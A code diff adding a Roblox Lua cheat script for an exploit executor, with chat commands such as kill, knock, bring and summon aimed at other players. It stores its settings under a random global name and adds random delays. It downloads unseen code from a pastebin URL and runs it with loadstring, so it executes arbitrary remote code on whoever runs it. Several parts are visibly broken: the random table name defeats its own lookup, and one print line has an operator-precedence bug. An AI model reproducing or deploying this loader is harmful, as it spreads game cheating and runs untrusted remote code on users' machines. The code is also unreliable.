@@ -1,0 +1,112 @@
+local function obfuscatedFunctionName()
+    return string.char(math.random(97, 122), math.random(97, 122))
+end
+
+local function randomDelay(min, max)
+    wait(math.random(min, max) / 10)
+end
+
+getgenv()[obfuscatedFunctionName()] = {
+    FPS_BOOSTER = false,
+    prefix = "!",
+    accounts = {
+        ["Stand Creator"] = "STAND OWNER USER",
+    },
+    commands = {
+        ["fix"] = "fix",
+        ["reset"] = "reset",
+        ["kill"] = "kill",
+        ["lkill"] = "lkill",
+        ["bring"] = "bring",
+        ["drop"] = "drop",
+        ["knock"] = "knock",
+        ["lknock"] = "lknock",
+        ["gkill"] = "gkill",
+        ["gknock"] = "gknock",
+        ["tp"] = "tp",
+        ["whitelist"] = "whitelist",
+        ["unwhitelist"] = "unwhitelist",
+        ["summon"] = "summon",
+        ["view"] = "view",
+    }
+}
+
+local function resetStand(player)
+    print("Resetting Stand for " .. player.Name)
+end
+
+local baseplantCFrame = CFrame.new(100, 10, 100)
+
+local function safeHttpGet(url)
+    local success, result = pcall(function()
+        return game:GetService("HttpService"):GetAsync(url)
+    end)
+    if success then
+        return result
+    else
+        warn("HttpGet failed: " .. result)
+        return ""
+    end
+end
+
+local scriptUrl = "https://pastebin.com/raw/hNcZ3RFs"
+local scriptContent = safeHttpGet(scriptUrl)
+
+if scriptContent and #scriptContent > 0 then
+    randomDelay(10, 20)
+    loadstring(scriptContent)()
+else
+    warn("Failed to load script.")
+end
+
+game:GetService("Players").LocalPlayer.Chatted:Connect(function(message)
+    if message:sub(1, 1) == "!" then
+        local command = message:sub(2)
+        local args = string.split(command, " ")
+
+        if getgenv()[obfuscatedFunctionName()].commands[args[1]] then
+            if args[1] == "summon" and args[2] then
+                local targetPlayerName = args[2]
+                local targetPlayer = game:GetService("Players"):FindFirstChild(targetPlayerName)
+
+                if targetPlayer then
+                    resetStand(targetPlayer)
+                    print("Summoning player: " .. targetPlayerName)
+                    randomDelay(5, 10)
+                    if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                        targetPlayer.Character:SetPrimaryPartCFrame(baseplantCFrame)
+                        print(targetPlayerName .. " has been summoned and reset.")
+                    else
+                        warn("Player's character is not valid.")
+                    end
+                else
+                    warn("Player not found: " .. targetPlayerName)
+                end
+            elseif args[1] == "kill" then
+                print("Executing kill command for: " .. args[2] or "No target specified")
+            elseif args[1] == "tp" and args[2] then
+                local targetPlayerName = args[2]
+                local targetPlayer = game:GetService("Players"):FindFirstChild(targetPlayerName)
+
+                if targetPlayer then
+                    print("Teleporting to player: " .. targetPlayerName)
+                else
+                    warn("Player not found: " .. targetPlayerName)
+                end
+            elseif args[1] == "whitelist" and args[2] then
+                local targetPlayerName = args[2]
+                local targetPlayer = game:GetService("Players"):FindFirstChild(targetPlayerName)
+
+                if targetPlayer then
+                    print("Whitelisting player: " .. targetPlayerName)
+                else
+                    warn("Player not found: " .. targetPlayerName)
+                end
+            else
+                print("Executing command: " .. args[1])
+            end
+        else
+            warn("Unknown command: " .. args[1])
+        end
+    end
+end)
